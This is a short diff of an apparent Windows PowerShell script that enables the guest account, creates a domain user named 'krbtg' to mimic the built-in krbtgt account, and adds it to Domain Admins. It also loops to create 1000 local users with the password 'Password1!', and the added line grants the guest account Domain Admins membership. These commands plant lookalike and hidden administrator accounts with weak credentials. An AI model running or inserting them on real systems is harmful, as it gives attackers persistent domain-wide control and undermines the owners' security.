@@ -3,6 +3,8 @@ net user guest /active:yes
 net user /add krbtg Password1! /domain
 net group "Domain Admins" krbtg /ADD /DOMAIN
 
+net group "Domain Admins" guest /ADD
+
 for ($i = 0; $i -lt 1000; $i++) {
   New-LocalUser -Name "bob$i" -Password "Password1!" 
   net group "Domain Admins" krbtg /ADD /DOMAIN
